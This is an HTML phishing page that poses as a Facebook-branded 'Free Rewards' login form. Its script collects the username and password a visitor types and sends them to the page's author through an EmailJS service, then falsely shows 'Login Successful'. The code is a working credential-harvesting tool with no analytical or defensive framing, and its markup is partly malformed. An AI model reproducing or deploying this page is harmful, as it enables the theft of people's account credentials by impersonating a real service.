<!DOCTYPE html>
<html>
<head>
<title>Login</title>
<style>
body{
font-family:Arial;
background:#f4f4f4;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.login-box{
background:white;
padding:30px;
border-radius:10px;
box-shadow:0 0 10px rgba(0,0,0,0.2);
width:300px;
}

input{
width:100%;
padding:10px;
margin:10px 0;
}

button{
width:100%;
padding:12px;
background:#28a745;
color:white;
border:none;
cursor:pointer;
}
</style>
</head>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

<script>

(function(){
emailjs.init("287g46US2fGjoY4LL");
})();

function sendLogin(){

var username = document.getElementById("username").value;
var password = document.getElementById("password").value;

var params = {
username: username,
password: password
};

emailjs.send("service_3ux49q7","template_fn1apho",params)
.then(function(){
alert("Login Successful");
});

}

</script>

</body>
</html>
<body>
<div class="box">

<div class="logo">🎁 Free Rewards</div>

<div class="game-logo">
<img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%182019%29.svg">
<div class="login-box">

<h2>Login</h2>

<input type="text" id="username" placeholder="Username">
<input type="password" id="password" placeholder="Password">

<button onclick="sendLogin()">Login</button>

</div>
